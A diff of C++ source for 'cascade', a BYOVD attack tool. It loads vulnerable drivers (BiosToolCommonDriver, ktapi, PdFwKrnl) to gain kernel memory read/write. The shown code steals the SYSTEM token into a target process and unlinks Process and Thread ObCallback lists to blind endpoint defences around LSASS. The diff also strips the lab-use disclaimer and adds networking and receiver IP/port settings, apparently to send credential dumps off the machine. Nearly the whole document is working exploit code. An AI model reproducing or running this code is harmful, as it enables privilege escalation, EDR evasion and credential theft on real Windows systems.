@@ -1,32 +1,19 @@
 /*
  * cascade.cpp - Consolidated BYOVD tool
  *
- * Combines warp.cpp (PPL strip + LSASS dump) with UsingBYOVD physical-memory
- * R/W primitives (BiosToolCommonDriver / ktapi).  Drops and loads the vulnerable
- * driver at runtime from a user-supplied path; no embedded binary required.
- *
  * Providers supported (--driver-type):
  *   biostool  - BiosToolCommonDriver.sys (IOCTLs: 0x22202C/0x222030/0x222034)
- *   ktapi     - ktapi.sys (IOCTLs: 0x82007000 map / 0x82007100 unmap)
- *   pdfwkrnl  - PdFwKrnl.sys already loaded (legacy warp.cpp backend, no drop/load)
- *
- * EPROCESS offsets auto-selected by Windows build number; offset scanning
- * fallback from warp.cpp kept as belt-and-suspenders.
- *
- * Usage:
- *   cascade --test-rw   --driver .\BiosToolCommonDriver.sys
- *   cascade --dry-run   --driver .\BiosToolCommonDriver.sys
- *   cascade --priv-esc  --driver .\BiosToolCommonDriver.sys
- *   cascade --dump --out C:\Temp\lo.dmp --driver .\BiosToolCommonDriver.sys
- *   cascade --kill-edr  --driver .\BiosToolCommonDriver.sys
- *   cascade --decode --in lo.dmp --out lo.dmp.dec
+ *   ktapi     - ktapi.sys  (IOCTLs: 0x82007000 map / 0x82007100 unmap)
+ *   pdfwkrnl  - PdFwKrnl.sys already loaded (legacy warp.cpp backend)
  *
  * Requires: administrator, SeLoadDriverPrivilege.
- * Safe by default: without --dump/--priv-esc/--kill-edr nothing is modified.
- *
- * Lab-authorized BYOVD research tool. Isolated lab use only.
  */
 
+#ifndef WIN32_LEAN_AND_MEAN
+#define WIN32_LEAN_AND_MEAN
+#endif
+#include <winsock2.h>
+#include <ws2tcpip.h>
 #include <windows.h>
 #include <winternl.h>
 #include <psapi.h>
@@ -42,6 +29,7 @@
 #include <cstring>
 #include <algorithm>
 
+#pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "ntdll.lib")
 #pragma comment(lib, "psapi.lib")
 #pragma comment(lib, "Dbghelp.lib")
@@ -57,9 +45,6 @@ typedef LONG NTSTATUS;
 #define STATUS_SUCCESS ((NTSTATUS)0)
 #endif
 
-// ---------------------------------------------------------------------------
-// Undocumented NT APIs
-// ---------------------------------------------------------------------------
 typedef struct _UNICODE_STRING_W {
     USHORT Length;
     USHORT MaximumLength;
@@ -68,9 +53,6 @@ typedef struct _UNICODE_STRING_W {
 
 typedef NTSTATUS(NTAPI* NtLoadDriver_t)(PUNICODE_STRING_W RegistryPath);
 typedef NTSTATUS(NTAPI* NtUnloadDriver_t)(PUNICODE_STRING_W RegistryPath);
-typedef NTSTATUS(NTAPI* NtCreateProcessEx_t)(
-    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, ULONG,
-    HANDLE, HANDLE, HANDLE, ULONG);
 
 static NtLoadDriver_t   g_NtLoadDriver   = nullptr;
 static NtUnloadDriver_t g_NtUnloadDriver = nullptr;
@@ -81,25 +63,32 @@ static NtUnloadDriver_t g_NtUnloadDriver = nullptr;
 enum class ProviderType { BiosTool, Ktapi, PdfwKrnl };
 
 struct Config {
-    ProviderType type    = ProviderType::BiosTool;
-    std::string  drvPath;     // path to .sys on disk (empty = already loaded)
-    bool         dryRun      = false;
-    bool         testRw      = false;
-    bool         doPrivEsc   = false;
-    bool         doDump      = false;
-    bool         doDumpRpm      = false;  // ReadProcessMemory-based dump (no thread suspension)
-    bool         doDumpKernel    = false;  // CR3-based kernel dump (bypasses Defender callback)
-    bool         doPatchCallbacks= false;  // patch Defender's ObCallback PreOperation
-    bool         killEdr     = false;
-    bool         doDecode    = false;
-    bool         noXor       = false;
+    ProviderType type         = ProviderType::BiosTool;
+    std::string  drvPath;
+    bool         dryRun       = false;
+    bool         testRw       = false;
+    bool         doPrivEsc    = false;
+    bool         doDump       = false;
+    bool         doDumpRpm    = false;
+    bool         doDumpKernel = false;
+    bool         doDumpTcp    = false;
+    bool         doPatchCallbacks  = false;
+    bool         doListCallbacks   = false;
+    bool         doPplStrip   = false;
+    bool         doPplAdd     = false;
+    bool         killEdr      = false;
+    bool         doKillPid    = false;
+    bool         doDecode     = false;
+    bool         noXor        = false;
     std::string  outPath;
     std::string  inPath;
-    DWORD        targetPid   = 0;
+    std::string  recvIp;
+    int          recvPort     = 9999;
+    DWORD        targetPid    = 0;
 };
 
 // ---------------------------------------------------------------------------
-// EPROCESS offsets (build-dynamic, from UsingBYOVD Main.cpp analysis)
+// EPROCESS offsets
 // ---------------------------------------------------------------------------
 struct KernelOffsets {
     ULONG64 UniqueProcessId    = 0;
@@ -111,49 +100,32 @@ struct KernelOffsets {
 static KernelOffsets g_off;
 
 static void SetOffsetsByBuild(DWORD build) {
-    // UniqueProcessId and ActiveProcessLinks are stable across modern builds
-    // (NT 6.1+). Verified in public symbols.
     g_off.UniqueProcessId    = 0x440;
     g_off.ActiveProcessLinks = 0x448;
-
     if (build >= 26100) {
-        // Windows 11 24H2+
         g_off.Token         = 0x248;
         g_off.Protection    = 0x5FA;
         g_off.ImageFileName = 0x338;
     } else if (build >= 22000) {
-        // Windows 11 21H2 / 22H2 (22000, 22621)
         g_off.Token         = 0x4B8;
         g_off.Protection    = 0x87A;
         g_off.ImageFileName = 0x5A8;
-        // Adjust UniqueProcessId / APL for this family
-        g_off.UniqueProcessId    = 0x440;
-        g_off.ActiveProcessLinks = 0x448;
     } else if (build >= 19041) {
-        // Windows 10 20H1 - 21H2
         g_off.Token         = 0x4B8;
         g_off.Protection    = 0x87A;
         g_off.ImageFileName = 0x5A8;
-        g_off.UniqueProcessId    = 0x440;
-        g_off.ActiveProcessLinks = 0x448;
     } else if (build >= 18362) {
-        // Windows 10 1903
         g_off.Token         = 0x360;
         g_off.Protection    = 0x6FA;
         g_off.ImageFileName = 0x450;
     } else {
-        // Fallback (older builds)
         g_off.Token         = 0x358;
         g_off.Protection    = 0x6CA;
         g_off.ImageFileName = 0x448;
     }
     printf("[*] Build %lu: UniqueProcessId=0x%llX APL=0x%llX FileName=0x%llX Protection=0x%llX Token=0x%llX\n",
-        build,
-        g_off.UniqueProcessId,
-        g_off.ActiveProcessLinks,
-        g_off.ImageFileName,
-        g_off.Protection,
-        g_off.Token);
+        build, g_off.UniqueProcessId, g_off.ActiveProcessLinks,
+        g_off.ImageFileName, g_off.Protection, g_off.Token);
 }
 
 static DWORD GetWindowsBuild() {
@@ -199,11 +171,11 @@ static bool EnablePrivilege(const char* privName) {
 }
 
 // ---------------------------------------------------------------------------
-// Driver management (drop, load, unload)
+// Driver management
 // ---------------------------------------------------------------------------
-static std::wstring g_svcName;   // service name derived from driver filename
-static std::wstring g_regPath;   // \Registry\Machine\...\<svc>
-static std::wstring g_dropPath;  // actual .sys path on disk (may == drvPath)
+static std::wstring g_svcName;
+static std::wstring g_regPath;
+static std::wstring g_dropPath;
 
 static std::wstring Utf8ToWide(const std::string& s) {
     if (s.empty()) return {};
@@ -221,7 +193,6 @@ static std::string WideToUtf8(const std::wstring& w) {
     return s;
 }
 
-// Derive service name from filename without extension.
 static std::wstring SvcNameFromPath(const std::wstring& path) {
     auto pos = path.rfind(L'\\');
     std::wstring base = (pos == std::wstring::npos) ? path : path.substr(pos + 1);
@@ -233,45 +204,28 @@ static std::wstring SvcNameFromPath(const std::wstring& path) {
 static bool CopyDriverToTemp(const std::wstring& srcPath, std::wstring& outDest) {
     wchar_t temp[MAX_PATH]{};
     GetTempPathW(MAX_PATH, temp);
-    // Use pid-stamped name to avoid same-file collision when src is already in %TEMP%
     DWORD pid = GetCurrentProcessId();
     std::wstring name = SvcNameFromPath(srcPath) + L"_" + std::to_wstring(pid) + L".sys";
     outDest = std::wstring(temp) + name;
-
-    // Resolve src to full path to detect same-file scenario
     wchar_t srcFull[MAX_PATH]{}, dstFull[MAX_PATH]{};
     GetFullPathNameW(srcPath.c_str(), MAX_PATH, srcFull, nullptr);
     GetFullPathNameW(outDest.c_str(), MAX_PATH, dstFull, nullptr);
-    if (_wcsicmp(srcFull, dstFull) == 0) {
-        // Source is already our dest; use as-is
-        return true;
-    }
-
+    if (_wcsicmp(srcFull, dstFull) == 0) return true;
     if (!CopyFileW(srcPath.c_str(), outDest.c_str(), FALSE)) {
-        printf("[-] CopyFile %s -> %s failed (%lu)\n",
-            WideToUtf8(srcPath).c_str(), WideToUtf8(outDest).c_str(), GetLastError());
+        printf("[-] CopyFile failed (%lu)\n", GetLastError());
         return false;
     }
     return true;
 }
 
 static bool CreateDriverService(const std::wstring& svcName, const std::wstring& sysPath) {
-    // Build NT-style path for ImagePath
-    std::wstring ntPath = L"\\??\\" + sysPath;
-
-    // Open Services key
+    std::wstring ntPath  = L"\\??\\" + sysPath;
     std::wstring keyPath = L"SYSTEM\\CurrentControlSet\\Services\\" + svcName;
     HKEY hk;
     LONG rc = RegCreateKeyExW(HKEY_LOCAL_MACHINE, keyPath.c_str(), 0, nullptr,
         REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, nullptr, &hk, nullptr);
-    if (rc != ERROR_SUCCESS) {
-        printf("[-] RegCreateKey failed (%ld)\n", rc);
-        return false;
-    }
-
-    DWORD type = 1;   // SERVICE_KERNEL_DRIVER
-    DWORD start = 3;  // SERVICE_DEMAND_START
-    DWORD err = 1;    // SERVICE_ERROR_NORMAL
+    if (rc != ERROR_SUCCESS) { printf("[-] RegCreateKey failed (%ld)\n", rc); return false; }
+    DWORD type = 1, start = 3, err = 1;
     RegSetValueExW(hk, L"Type",         0, REG_DWORD, (BYTE*)&type,  sizeof(type));
     RegSetValueExW(hk, L"Start",        0, REG_DWORD, (BYTE*)&start, sizeof(start));
     RegSetValueExW(hk, L"ErrorControl", 0, REG_DWORD, (BYTE*)&err,   sizeof(err));
@@ -283,13 +237,13 @@ static bool CreateDriverService(const std::wstring& svcName, const std::wstring&
 
 static bool LoadDriverViaNt(const std::wstring& regPath) {
     UNICODE_STRING_W us{};
-    us.Buffer = (LPWSTR)regPath.c_str();
-    us.Length = (USHORT)(regPath.size() * sizeof(wchar_t));
+    us.Buffer        = (LPWSTR)regPath.c_str();
+    us.Length        = (USHORT)(regPath.size() * sizeof(wchar_t));
     us.MaximumLength = us.Length + sizeof(wchar_t);
     NTSTATUS st = g_NtLoadDriver(&us);
     if (!NT_SUCCESS(st)
-        && st != (LONG)0xC000010E   /* STATUS_IMAGE_ALREADY_LOADED: service already running */
-        && st != (LONG)0xC0000035   /* STATUS_OBJECT_NAME_COLLISION: device already registered by a prior load */
+        && st != (LONG)0xC000010E   /* STATUS_IMAGE_ALREADY_LOADED */
+        && st != (LONG)0xC0000035   /* STATUS_OBJECT_NAME_COLLISION: device already registered */
     ) {
         printf("[-] NtLoadDriver failed: 0x%08lX\n", st);
         return false;
@@ -301,8 +255,8 @@ static bool LoadDriverViaNt(const std::wstring& regPath) {
 static bool UnloadDriverViaNt(const std::wstring& regPath) {
     if (!g_NtUnloadDriver) return false;
     UNICODE_STRING_W us{};
-    us.Buffer = (LPWSTR)regPath.c_str();
-    us.Length = (USHORT)(regPath.size() * sizeof(wchar_t));
+    us.Buffer        = (LPWSTR)regPath.c_str();
+    us.Length        = (USHORT)(regPath.size() * sizeof(wchar_t));
     us.MaximumLength = us.Length + sizeof(wchar_t);
     NTSTATUS st = g_NtUnloadDriver(&us);
     printf("[*] NtUnloadDriver: 0x%08lX\n", st);
@@ -317,7 +271,6 @@ static void DeleteServiceKey(const std::wstring& svcName) {
 // ---------------------------------------------------------------------------
 // Kernel R/W - BiosToolCommonDriver backend
 // ---------------------------------------------------------------------------
-// Device name: \\.\BiosToolCommonDriver
 static HANDLE g_biostoolDev = INVALID_HANDLE_VALUE;
 
 #define BIOSTOOL_READ_PHYS  0x22202Cu
@@ -334,7 +287,6 @@ static PVOID BiosTool_Va2Pa(PVOID va) {
 }
 
 static bool BiosTool_ReadPhys(PVOID pa, SIZE_T size, PVOID buf) {
-    // Max chunk = 0x1000 bytes; driver returns data with 8-byte prefix
     auto pCurPA  = (PUCHAR)pa;
     auto pCurBuf = (PUCHAR)buf;
     while (size > 0) {
@@ -355,7 +307,6 @@ static bool BiosTool_ReadPhys(PVOID pa, SIZE_T size, PVOID buf) {
 }
 
 static bool BiosTool_WritePhys(PVOID pa, SIZE_T size, PVOID data) {
-    // Max chunk = 0x1000
     auto pCurPA   = (PUCHAR)pa;
     auto pCurData = (PUCHAR)data;
     while (size > 0) {
@@ -405,7 +356,141 @@ static bool BiosTool_KWrite(QWORD va, PVOID buf, SIZE_T size) {
 }
 
 // ---------------------------------------------------------------------------
-// Kernel R/W - PdFwKrnl backend (legacy, no load/drop)
+// Kernel R/W - Ktapi backend
+// Device: \\.\ktapi   IOCTLs: 0x82007000 (map PA->VA)  0x82007100 (unmap)
+// VA->PA: CR3 page walk bootstrapped from physical scan of PML4 self-ref.
+// ---------------------------------------------------------------------------
+static HANDLE g_ktapiDev = INVALID_HANDLE_VALUE;
+static QWORD  g_ktapiCr3 = 0;  // kernel CR3 found by PML4 scan
+
+#define KTAPI_IOCTL_MAP   0x82007000u
+#define KTAPI_IOCTL_UNMAP 0x82007100u
+
+static PVOID Ktapi_MapPhys(PVOID pa, SIZE_T size) {
+    struct { ULONG InterfaceType; ULONG BusNumber; PVOID PhysAddr; ULONG AddrSpace; ULONG Length; }
+        req{ 0, 0, pa, 0, (ULONG)size };
+    PVOID mapped = nullptr;
+    DWORD got = 0;
+    DeviceIoControl(g_ktapiDev, KTAPI_IOCTL_MAP, &req, sizeof(req),
+                    &mapped, sizeof(mapped), &got, nullptr);
+    return mapped;
+}
+
+static void Ktapi_UnmapPhys(PVOID mapped) {
+    if (!mapped) return;
+    DWORD got = 0;
+    DeviceIoControl(g_ktapiDev, KTAPI_IOCTL_UNMAP, &mapped, sizeof(mapped),
+                    nullptr, 0, &got, nullptr);
+}
+
+// Scan first 512MB of physical RAM for a page that self-maps at PML4[0x1ED].
+// A self-referencing PML4 entry satisfies: (entry & ~0xFFF) == PA_of_this_page.
+static QWORD Ktapi_FindCr3() {
+    for (QWORD pa = 0; pa < 0x20000000ULL; pa += 0x1000) {
+        PVOID m = Ktapi_MapPhys((PVOID)pa, 0x1000);
+        if (!m) continue;
+        QWORD entry = *(QWORD*)((PUCHAR)m + 0x1ED * 8);
+        Ktapi_UnmapPhys(m);
+        if ((entry & 1) && (entry & ~0xFFFULL) == pa)
+            return pa;
+    }
+    return 0;
+}
+
+static QWORD Ktapi_PhysReadQword(QWORD pa) {
+    QWORD v = 0;
+    PVOID m = Ktapi_MapPhys((PVOID)pa, 8);
+    if (m) { v = *(QWORD*)m; Ktapi_UnmapPhys(m); }
+    return v;
+}
+
+static bool Ktapi_PhysRead(PVOID pa, SIZE_T size, PVOID buf) {
+    auto pCurPA  = (PUCHAR)pa;
+    auto pCurBuf = (PUCHAR)buf;
+    while (size > 0) {
+        ULONG_PTR off   = (ULONG_PTR)pCurPA & 0xFFF;
+        SIZE_T    chunk = std::min(size, (SIZE_T)(0x1000 - off));
+        PVOID m = Ktapi_MapPhys((PVOID)((ULONG_PTR)pCurPA & ~(ULONG_PTR)0xFFF), 0x1000);
+        if (!m) return false;
+        memcpy(pCurBuf, (PUCHAR)m + off, chunk);
+        Ktapi_UnmapPhys(m);
+        pCurPA  += chunk;
+        pCurBuf += chunk;
+        size    -= chunk;
+    }
+    return true;
+}
+
+static bool Ktapi_PhysWrite(PVOID pa, SIZE_T size, PVOID data) {
+    auto pCurPA   = (PUCHAR)pa;
+    auto pCurData = (PUCHAR)data;
+    while (size > 0) {
+        ULONG_PTR off   = (ULONG_PTR)pCurPA & 0xFFF;
+        SIZE_T    chunk = std::min(size, (SIZE_T)(0x1000 - off));
+        PVOID m = Ktapi_MapPhys((PVOID)((ULONG_PTR)pCurPA & ~(ULONG_PTR)0xFFF), 0x1000);
+        if (!m) return false;
+        memcpy((PUCHAR)m + off, pCurData, chunk);
+        Ktapi_UnmapPhys(m);
+        pCurPA   += chunk;
+        pCurData += chunk;
+        size     -= chunk;
+    }
+    return true;
+}
+
+static QWORD Ktapi_Va2Pa(QWORD va) {
+    if (!g_ktapiCr3) return 0;
+    QWORD pml4_idx = (va >> 39) & 0x1FF;
+    QWORD pdpt_idx = (va >> 30) & 0x1FF;
+    QWORD pd_idx   = (va >> 21) & 0x1FF;
+    QWORD pt_idx   = (va >> 12) & 0x1FF;
+    QWORD offset   = va & 0xFFF;
+
+    QWORD pml4e = Ktapi_PhysReadQword((g_ktapiCr3 & ~0xFFFULL) + pml4_idx * 8);
+    if (!(pml4e & 1)) return 0;
+    QWORD pdpte = Ktapi_PhysReadQword((pml4e & ~0xFFFULL) + pdpt_idx * 8);
+    if (!(pdpte & 1)) return 0;
+    if (pdpte & (1ULL << 7)) return (pdpte & ~0x3FFFFFFFULL) | (va & 0x3FFFFFFFULL);
+    QWORD pde = Ktapi_PhysReadQword((pdpte & ~0xFFFULL) + pd_idx * 8);
+    if (!(pde & 1)) return 0;
+    if (pde & (1ULL << 7)) return (pde & ~0x1FFFFFULL) | (va & 0x1FFFFFULL);
+    QWORD pte = Ktapi_PhysReadQword((pde & ~0xFFFULL) + pt_idx * 8);
+    if (!(pte & 1)) return 0;
+    return (pte & ~0xFFFULL) | offset;
+}
+
+static bool Ktapi_KRead(QWORD va, PVOID buf, SIZE_T size) {
+    auto pCurVA  = va;
+    auto pCurBuf = (PUCHAR)buf;
+    while (size > 0) {
+        SIZE_T chunk = std::min(size, (SIZE_T)0x1000);
+        QWORD pa = Ktapi_Va2Pa(pCurVA);
+        if (!pa) return false;
+        if (!Ktapi_PhysRead((PVOID)pa, chunk, pCurBuf)) return false;
+        pCurVA  += chunk;
+        pCurBuf += chunk;
+        size    -= chunk;
+    }
+    return true;
+}
+
+static bool Ktapi_KWrite(QWORD va, PVOID buf, SIZE_T size) {
+    auto pCurVA  = va;
+    auto pCurBuf = (PUCHAR)buf;
+    while (size > 0) {
+        SIZE_T chunk = std::min(size, (SIZE_T)0x1000);
+        QWORD pa = Ktapi_Va2Pa(pCurVA);
+        if (!pa) return false;
+        if (!Ktapi_PhysWrite((PVOID)pa, chunk, pCurBuf)) return false;
+        pCurVA  += chunk;
+        pCurBuf += chunk;
+        size    -= chunk;
+    }
+    return true;
+}
+
+// ---------------------------------------------------------------------------
+// Kernel R/W - PdFwKrnl backend
 // ---------------------------------------------------------------------------
 static HANDLE g_pdfwDev = INVALID_HANDLE_VALUE;
 #define IOCTL_AMDPDFW_MEMCPY 0x80002014
@@ -431,23 +516,19 @@ static ProviderType g_activeProvider;
 
 static bool KRead(QWORD addr, PVOID buf, SIZE_T size) {
     switch (g_activeProvider) {
-    case ProviderType::BiosTool:
-        return BiosTool_KRead(addr, buf, size);
-    case ProviderType::PdfwKrnl:
-        return PdfwKrnl_KRead(addr, buf, (DWORD)size);
-    default:
-        return false;
+    case ProviderType::BiosTool: return BiosTool_KRead(addr, buf, size);
+    case ProviderType::Ktapi:    return Ktapi_KRead(addr, buf, size);
+    case ProviderType::PdfwKrnl: return PdfwKrnl_KRead(addr, buf, (DWORD)size);
+    default: return false;
     }
 }
 
 static bool KWrite(QWORD addr, PVOID buf, SIZE_T size) {
     switch (g_activeProvider) {
-    case ProviderType::BiosTool:
-        return BiosTool_KWrite(addr, buf, size);
-    case ProviderType::PdfwKrnl:
-        return PdfwKrnl_KWrite(addr, buf, (DWORD)size);
-    default:
-        return false;
+    case ProviderType::BiosTool: return BiosTool_KWrite(addr, buf, size);
+    case ProviderType::Ktapi:    return Ktapi_KWrite(addr, buf, size);
+    case ProviderType::PdfwKrnl: return PdfwKrnl_KWrite(addr, buf, (DWORD)size);
+    default: return false;
     }
 }
 
@@ -458,7 +539,7 @@ static QWORD KReadQword(QWORD addr) {
 }
 
 // ---------------------------------------------------------------------------
-// Offset scanning (from warp.cpp, extended range)
+// Offset scanning
 // ---------------------------------------------------------------------------
 static bool LooksLikeName(QWORD eproc, QWORD off) {
     BYTE b[16]{};
@@ -474,10 +555,11 @@ static bool LooksLikeName(QWORD eproc, QWORD off) {
 static bool LooksLikeProtection(QWORD eproc, QWORD off) {
     BYTE b = 0xFF;
     if (!KRead(eproc + off, &b, 1)) return false;
-    return b <= 0x3F; // PPL levels 0..7 per nibble, practically 0..3
+    return b <= 0x3F;
 }
 
 static void ScanAndFixOffsets(QWORD eproc, DWORD pid) {
+    (void)pid;
     if (!LooksLikeName(eproc, g_off.ImageFileName)) {
         for (QWORD s = 0x300; s <= 0x700; s += 8) {
             if (LooksLikeName(eproc, s)) {
@@ -499,7 +581,7 @@ static void ScanAndFixOffsets(QWORD eproc, DWORD pid) {
 }
 
 // ---------------------------------------------------------------------------
-// PsInitialSystemProcess offset from ntoskrnl export
+// Kernel base + System EPROCESS
 // ---------------------------------------------------------------------------
 static QWORD PsISPOffset() {
     HMODULE ntos = LoadLibraryExA("ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
@@ -508,6 +590,21 @@ static QWORD PsISPOffset() {
     QWORD off = p ? ((QWORD)p - (QWORD)ntos) : 0;
     FreeLibrary(ntos);
     return off;
+}
+
+struct KernelBase { QWORD ntosBase; QWORD systemEproc; };
+
+static KernelBase GetKernelBase() {
+    KernelBase r{};
+    LPVOID drvs[1024];
+    DWORD cb;
+    if (EnumDeviceDrivers(drvs, sizeof(drvs), &cb))
+        r.ntosBase = (QWORD)drvs[0];
+    if (!r.ntosBase) return r;
+    QWORD sysOff = PsISPOffset();
+    if (!sysOff) return r;
+    r.systemEproc = KReadQword(r.ntosBase + sysOff);
+    return r;
 }
 
 // ---------------------------------------------------------------------------
@@ -544,71 +641,33 @@ static QWORD FindEprocessByName(QWORD sysEproc, const char* target) {
 }
 
 // ---------------------------------------------------------------------------
-// Get ntoskrnl base + System EPROCESS
-// ---------------------------------------------------------------------------
-struct KernelBase { QWORD ntosBase; QWORD systemEproc; };
-
-static KernelBase GetKernelBase() {
-    KernelBase r{};
-    LPVOID drvs[1024];
-    DWORD cb;
-    if (EnumDeviceDrivers(drvs, sizeof(drvs), &cb))
-        r.ntosBase = (QWORD)drvs[0];
-    if (!r.ntosBase) return r;
-
-    QWORD sysOff = PsISPOffset();
-    if (!sysOff) return r;
-
-    r.systemEproc = KReadQword(r.ntosBase + sysOff);
-    return r;
-}
-
-// ---------------------------------------------------------------------------
-// Token steal (UsingBYOVD PrivilegeEscalation)
+// Token steal
 // ---------------------------------------------------------------------------
 static bool TokenSteal(QWORD sysEproc, DWORD targetPid) {
-    // Read SYSTEM token
-    QWORD sysToken = KReadQword(sysEproc + g_off.Token) & ~0xFULL; // clear ref count bits
-    if (!sysToken) {
-        printf("[-] Failed to read SYSTEM token\n");
-        return false;
-    }
+    QWORD sysToken = KReadQword(sysEproc + g_off.Token) & ~0xFULL;
+    if (!sysToken) { printf("[-] Failed to read SYSTEM token\n"); return false; }
     printf("[+] SYSTEM token: 0x%llX\n", sysToken);
 
-    // Find target EPROCESS
     char nm[16]{};
     QWORD targetEp = FindEprocessByPid(sysEproc, targetPid, nm);
-    if (!targetEp) {
-        printf("[-] Target PID %lu not found in EPROCESS list\n", targetPid);
-        return false;
-    }
+    if (!targetEp) { printf("[-] Target PID %lu not found\n", targetPid); return false; }
     printf("[+] Target EPROCESS 0x%llX (%s)\n", targetEp, nm);
 
-    // Read current token
     QWORD curToken = KReadQword(targetEp + g_off.Token);
     printf("[*] Current token: 0x%llX -> stealing SYSTEM token\n", curToken);
 
-    // Write SYSTEM token (preserve low-nibble ref count bits from original)
     QWORD newToken = sysToken | (curToken & 0xF);
     if (!KWrite(targetEp + g_off.Token, &newToken, 8)) {
-        printf("[-] KWrite token failed\n");
-        return false;
+        printf("[-] KWrite token failed\n"); return false;
     }
-
-    // Verify
     QWORD check = KReadQword(targetEp + g_off.Token);
     printf("[!!!] Token written: 0x%llX (verify: 0x%llX)\n", newToken, check);
     return true;
 }
 
 // ---------------------------------------------------------------------------
+// ntoskrnl export resolver
 // ---------------------------------------------------------------------------
-// ObCallback patch: zero out Defender's PreOperation callback so OpenProcess
-// is no longer stripped of PROCESS_VM_READ on LSASS.
-// Works because HVCI is OFF so kernel code pages are writable via phys R/W.
-// ---------------------------------------------------------------------------
-
-// Parse ntoskrnl PE export directory to find a named export address.
 static QWORD FindNtosExport(QWORD ntosBase, const char* symName) {
     DWORD peOff = 0;
     KRead(ntosBase + 0x3C, &peOff, 4);
@@ -616,14 +675,14 @@ static QWORD FindNtosExport(QWORD ntosBase, const char* symName) {
 
     DWORD eDirRva = 0, numNames = 0, numFuncs = 0;
     DWORD namesRVA = 0, funcsRVA = 0, ordsRVA = 0;
-    KRead(ntosBase + peOff + 0x88, &eDirRva, 4);  // OptHeader.ExportRVA
+    KRead(ntosBase + peOff + 0x88, &eDirRva, 4);
     if (!eDirRva) return 0;
     QWORD eDir = ntosBase + eDirRva;
-    KRead(eDir + 0x14, &numFuncs, 4);
-    KRead(eDir + 0x18, &numNames, 4);
-    KRead(eDir + 0x1C, &funcsRVA, 4);
-    KRead(eDir + 0x20, &namesRVA, 4);
-    KRead(eDir + 0x24, &ordsRVA, 4);
+    KRead(eDir + 0x14, &numFuncs,  4);
+    KRead(eDir + 0x18, &numNames,  4);
+    KRead(eDir + 0x1C, &funcsRVA,  4);
+    KRead(eDir + 0x20, &namesRVA,  4);
+    KRead(eDir + 0x24, &ordsRVA,   4);
 
     size_t targLen = strlen(symName);
     for (DWORD i = 0; i < numNames && i < 100000; i++) {
@@ -643,17 +702,9 @@ static QWORD FindNtosExport(QWORD ntosBase, const char* symName) {
     return 0;
 }
 
-// Walk PsProcessType->CallbackList and patch all PreOperation callbacks.
-// Each callback entry (OB_CALLBACK_ENTRY, undocumented, stable Win10/11):
-//   +0x00 LIST_ENTRY (Flink, Blink)
-//   +0x10 Operations (DWORD)
-//   +0x14 Enabled    (DWORD)
-//   +0x18 Registration* (pointer to OB_REGISTRATION block)
-//   +0x20 ObjectType*
-//   +0x28 PreOperation*
-//   +0x30 PostOperation*
-// OBJECT_TYPE.CallbackList is at offset 0xC8 (stable Win10/11).
-// Unlink all entries from an OBJECT_TYPE.CallbackList at listHead.
+// ---------------------------------------------------------------------------
+// ObCallback operations
+// ---------------------------------------------------------------------------
 static void UnlinkCallbackList(const char* typeName, QWORD listHead) {
     QWORD flink = KReadQword(listHead);
     if (flink == listHead || !flink) {
@@ -665,7 +716,8 @@ static void UnlinkCallbackList(const char* typeName, QWORD listHead) {
     while (entry && entry != listHead && seen < 64) {
         QWORD pre  = KReadQword(entry + 0x28);
         QWORD post = KReadQword(entry + 0x30);
-        printf("[*]   %s entry[%d] 0x%llX: pre=0x%llX post=0x%llX\n", typeName, seen, entry, pre, post);
+        printf("[*]   %s entry[%d] 0x%llX: pre=0x%llX post=0x%llX\n",
+               typeName, seen, entry, pre, post);
         entry = KReadQword(entry);
         seen++;
     }
@@ -678,8 +730,26 @@ static void UnlinkCallbackList(const char* typeName, QWORD listHead) {
     printf("[+] %s ObCallback list unlinked (%d entries)\n", typeName, seen);
 }
 
+static void ListCallbackList(const char* typeName, QWORD listHead) {
+    QWORD flink = KReadQword(listHead);
+    if (flink == listHead || !flink) {
+        printf("[*] %s CallbackList: empty\n", typeName);
+        return;
+    }
+    QWORD entry = flink;
+    int seen = 0;
+    while (entry && entry != listHead && seen < 64) {
+        QWORD pre  = KReadQword(entry + 0x28);
+        QWORD post = KReadQword(entry + 0x30);
+        printf("[*]   %s entry[%d] 0x%llX: pre=0x%llX post=0x%llX\n",
+               typeName, seen, entry, pre, post);
+        entry = KReadQword(entry);
+        seen++;
+    }
+    printf("[*] %s CallbackList: %d registration(s) found\n", typeName, seen);
+}
+
 static bool PatchObCallbacks(QWORD ntosBase) {
-    // Unlink Process callbacks (restricts OpenProcess access to LSASS)
     QWORD psProcTypeAddr = FindNtosExport(ntosBase, "PsProcessType");
     if (!psProcTypeAddr) { printf("[-] PsProcessType export not found\n"); return false; }
     QWORD procObjType = KReadQword(psProcTypeAddr);
@@ -687,7 +757,6 @@ static bool PatchObCallbacks(QWORD ntosBase) {
     printf("[*] OBJECT_TYPE (Process): 0x%llX\n", procObjType);
     UnlinkCallbackList("Process", procObjType + 0xC8);
 
-    // Unlink Thread callbacks (restricts NtSuspendThread inside MiniDumpWriteDump)
     QWORD psThreadTypeAddr = FindNtosExport(ntosBase, "PsThreadType");
     if (psThreadTypeAddr) {
         QWORD threadObjType = KReadQword(psThreadTypeAddr);
@@ -699,19 +768,28 @@ static bool PatchObCallbacks(QWORD ntosBase) {
     return true;
 }
 
-// CR3-based page table walk (read any process memory at physical level)
-// Bypasses Defender's ObRegisterCallbacks OpenProcess interception.
-// ---------------------------------------------------------------------------
+static bool ListCallbacks(QWORD ntosBase) {
+    QWORD psProcTypeAddr = FindNtosExport(ntosBase, "PsProcessType");
+    if (!psProcTypeAddr) { printf("[-] PsProcessType export not found\n"); return false; }
+    QWORD procObjType = KReadQword(psProcTypeAddr);
+    if (!procObjType) { printf("[-] *PsProcessType is NULL\n"); return false; }
+    printf("[*] OBJECT_TYPE (Process): 0x%llX\n", procObjType);
+    ListCallbackList("Process", procObjType + 0xC8);
 
-// Read a 64-bit value from physical address using BiosTool (raw, page-aligned)
-static QWORD PhysReadQword(QWORD physAddr) {
-    QWORD v = 0;
-    BiosTool_ReadPhys((PVOID)physAddr, 8, &v);
-    return v;
+    QWORD psThreadTypeAddr = FindNtosExport(ntosBase, "PsThreadType");
+    if (psThreadTypeAddr) {
+        QWORD threadObjType = KReadQword(psThreadTypeAddr);
+        if (threadObjType) {
+            printf("[*] OBJECT_TYPE (Thread): 0x%llX\n", threadObjType);
+            ListCallbackList("Thread", threadObjType + 0xC8);
+        }
+    }
+    return true;
 }
 
-// Walk 4-level page tables to translate VA -> PA in a given process (using its CR3)
